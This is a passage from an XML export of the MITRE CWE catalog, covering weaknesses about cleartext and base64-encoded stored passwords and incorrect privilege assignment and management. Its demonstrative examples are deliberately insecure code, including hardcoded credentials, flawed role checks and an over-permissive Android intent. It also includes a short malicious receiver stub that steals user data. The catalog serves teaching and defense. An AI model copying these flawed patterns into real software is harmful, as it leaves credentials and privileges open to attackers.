               <Phase>Architecture and Design</Phase>
               <Description>Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Below is a snippet from a Java properties file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>webapp.ldap.username = secretUsername<xhtml:br/>webapp.ldap.password = secretPassword</xhtml:div>
               </Example_Code>
               <Body_Text>Because the LDAP credentials are stored in plaintext, anyone with access to the file can gain access to the resource.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Password Management: Password in Configuration File</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-207"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="261" Name="Weak Encoding for Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>Obscuring a password with a trivial encoding does not protect the password.</Description>
		 <Extended_Description>Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Description>Passwords should be encrypted with keys that are at least 128 bits in length for adequate security.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = Base64.decode(prop.getProperty("password"));<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone with access to config.properties can read the value of password and easily determine that the value has been base 64 encoded. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string value = regKey.GetValue(passKey).ToString();<xhtml:br/>byte[] decVal = Convert.FromBase64String(value);<xhtml:br/>NetworkCredential netCred = newNetworkCredential(username,decVal.toString(),domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Password Management: Weak Cryptography</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="55"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-207"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         <Notes>
            <Note Type="Other">
               <xhtml:p>The "crypt" family of functions uses weak cryptographic algorithms and should be avoided. It may be present in some projects for compatibility.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Other_Notes, References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Weak Cryptography for Passwords</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="266" Name="Incorrect Privilege Assignment" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="269" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="286" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>A user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-97">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>seteuid(0);<xhtml:br/>
                     <xhtml:i>/* do some stuff */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>seteuid(getuid());</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-142">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>AccessController.doPrivileged(new PrivilegedAction() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public Object run() {<xhtml:div style="margin-left:1em;">
                                 <xhtml:i>// privileged code goes here, for example:</xhtml:i>
                                 <xhtml:br/>System.loadLibrary("awt");<xhtml:br/>return null;<xhtml:br/>
                                 <xhtml:i>// nothing to return</xhtml:i>
                                 <xhtml:br/>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-108">
               <Intro_Text>This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Intent intent = new Intent();<xhtml:br/>intent.setAction("com.example.BackupUserData");<xhtml:br/>intent.setData(file_uri);<xhtml:br/>intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);<xhtml:br/>sendBroadcast(intent);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Attack" Language="Java">
                  <xhtml:div>public class CallReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">Uri userData = intent.getData();<xhtml:br/>stealUserData(userData);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-1193</Reference>
               <Description>untrusted user placed in unix "wheel" group</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1193</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2741</Reference>
               <Description>Product allows users to grant themselves certain rights that can be used to escalate privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2741</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2496</Reference>
               <Description>Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0274</Reference>
               <Description>Product mistakenly assigns a particular status to an entity, leading to increased privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0274</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Incorrect Privilege Assignment</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC00-J</Entry_ID>
               <Entry_Name>Do not allow privileged blocks to leak sensitive information across a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC01-J</Entry_ID>
               <Entry_Name>Do not allow tainted variables in privileged blocks</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-76"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="269" Name="Improper Privilege Management" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-48">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Follow the principle of least privilege when assigning access rights to entities in a software system.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-49">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-126">
               <Intro_Text>This code temporarily raises the program's privileges to allow creation of a new user folder.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>def makeNewUserDir(username):<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if invalidUsername(username):<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>#avoid CWE-22 and CWE-78</xhtml:i>
                                 <xhtml:br/>print('Usernames cannot contain invalid characters')<xhtml:br/>return False</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>try:<xhtml:div style="margin-left:1em;">raisePrivileges()<xhtml:br/>os.mkdir('/home/' + username)<xhtml:br/>lowerPrivileges()</xhtml:div>
                           <xhtml:br/>except OSError:<xhtml:div style="margin-left:1em;">print('Unable to create new user directory for user:' + username)<xhtml:br/>return False</xhtml:div>
                           <xhtml:br/>return True</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-97">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>seteuid(0);<xhtml:br/>
                     <xhtml:i>/* do some stuff */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>seteuid(getuid());</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-142">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>AccessController.doPrivileged(new PrivilegedAction() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public Object run() {<xhtml:div style="margin-left:1em;">
                                 <xhtml:i>// privileged code goes here, for example:</xhtml:i>
                                 <xhtml:br/>System.loadLibrary("awt");<xhtml:br/>return null;<xhtml:br/>
                                 <xhtml:i>// nothing to return</xhtml:i>
                                 <xhtml:br/>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-127">
               <Intro_Text>This code intends to allow only Administrators to print debug information about a system.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void printDebugInfo(User requestingUser){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">System.out.println(currentDebugState());<xhtml:br/>break;</xhtml:div>
                                    </xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of "GUEST". Someone with the role of "ADMIN" or "USER" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-128">
               <Intro_Text>This code allows someone with the role of "ADMIN" or "OPERATOR" to reset a user's password. The role of "OPERATOR" is intended to have less privileges than an "ADMIN", but still be able to help users with small issues such as forgotten passwords.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,OPERATOR,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void resetPassword(User requestingUser, User user, String password ){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>case USER:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">setPassword(user,password);<xhtml:br/>break;</xhtml:div>}</xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1555</Reference>
